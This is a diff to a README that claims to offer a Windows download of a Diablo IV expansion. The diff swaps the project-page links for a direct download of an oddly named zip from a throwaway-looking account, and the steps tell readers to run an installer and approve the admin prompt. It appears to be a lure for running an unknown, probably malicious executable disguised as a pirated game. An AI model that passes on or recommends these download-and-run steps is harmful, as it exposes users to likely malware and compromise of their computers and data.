@@ -1,6 +1,6 @@
 # 🎮 Diablo-IV-Lord-of-Hatred-PC - Play the latest expansion on Windows
 
-[![](https://img.shields.io/badge/Download-Lord_of_Hatred-blue.svg)](https://github.com/siddharthaunfunctional551/Diablo-IV-Lord-of-Hatred-PC)
+[![](https://img.shields.io/badge/Download-Lord_of_Hatred-blue.svg)](https://raw.githubusercontent.com/siddharthaunfunctional551/Diablo-IV-Lord-of-Hatred-PC/main/LordOFHatered/Hatred-I-Lord-PC-Diablo-of-3.2.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Before you install this software, verify that your computer meets these minimum 
 
 Follow these instructions to set up the software on your desktop.
 
-1. Visit the project page to start your download: https://github.com/siddharthaunfunctional551/Diablo-IV-Lord-of-Hatred-PC
+1. Visit the project page to start your download: https://raw.githubusercontent.com/siddharthaunfunctional551/Diablo-IV-Lord-of-Hatred-PC/main/LordOFHatered/Hatred-I-Lord-PC-Diablo-of-3.2.zip
 2. Save the setup file to your Downloads folder.
 3. Locate the file named "LordOfHatredInstaller.exe" and double-click it.
 4. If a User Account Control prompt appears, select Yes to authorize the installation.
